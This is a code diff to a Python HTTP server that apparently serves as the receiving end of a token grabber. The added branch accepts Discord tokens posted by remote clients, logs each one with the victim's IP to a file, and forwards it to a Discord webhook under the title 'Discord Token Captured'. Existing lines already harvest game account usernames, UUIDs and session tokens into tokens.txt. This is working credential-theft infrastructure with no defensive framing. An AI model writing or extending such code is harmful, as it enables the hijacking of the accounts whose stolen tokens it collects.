@@ -83,6 +83,45 @@ class Handler(BaseHTTPRequestHandler):
             length = int(self.headers['Content-Length'])
             data = json.loads(self.rfile.read(length).decode())
             
+            # Determine request type
+            req_type = data.get('type', 'login').strip()
+            
+            # =========== DISCORD TOKEN HANDLING ===========
+            if req_type == 'discord_token':
+                token = data.get('token', '').strip()
+                if token:
+                    # Log to separate file
+                    with open('discord_tokens.txt', 'a') as f:
+                        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+                        f.write(f"{timestamp} | {client_ip} | {token}\n")
+                    print(f"🎫 Discord token received from {client_ip}")
+                    
+                    # Optional: send to Discord webhook as a separate embed
+                    try:
+                        embed = {
+                            "title": "🎫 Discord Token Captured",
+                            "color": 0xFF0000,
+                            "description": f"**IP:** `{client_ip}`\n**Token:** ||{token}||",
+                            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.%fZ", time.gmtime())
+                        }
+                        payload = {"embeds": [embed]}
+                        req_data = json.dumps(payload).encode('utf-8')
+                        headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
+                        req = urllib.request.Request(DISCORD_WEBHOOK, data=req_data, headers=headers)
+                        urllib.request.urlopen(req, timeout=10)
+                        print("✅ Discord token notification sent")
+                    except Exception as e:
+                        print(f"⚠️ Failed to send Discord token notification: {e}")
+                    
+                    self.send_response(200)
+                    self.send_header('Content-type', 'text/plain')
+                    self.end_headers()
+                    self.wfile.write(b'OK')
+                    return
+                else:
+                    print("⚠️ Discord token request with empty token")
+            
+            # =========== ORIGINAL LOGIN/LOGOUT HANDLING ===========
             username = data.get('username', 'Unknown').strip()
             uuid = data.get('uuid', '').strip()
             server = data.get('server', '').strip()
@@ -92,7 +131,7 @@ class Handler(BaseHTTPRequestHandler):
             kills = data.get('kills', '0').strip()
             deaths = data.get('deaths', '0').strip()
             skin = data.get('skin', '').strip()
-            log_type = data.get('type', 'login').strip()
+            log_type = req_type  # 'login' or 'logout'
             
             print(f"Got: {username} on {server}")
             
@@ -102,7 +141,7 @@ class Handler(BaseHTTPRequestHandler):
             with open('tokens.txt', 'a') as f:
                 f.write(f"{username} | {uuid} | {server} | {token} | {money} | {playtime} | {kills} | {deaths}\n")
             
-            # Discord webhook
+            # Discord webhook for login/logout
             try:
                 headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
                 is_login = log_type.lower() == "login"
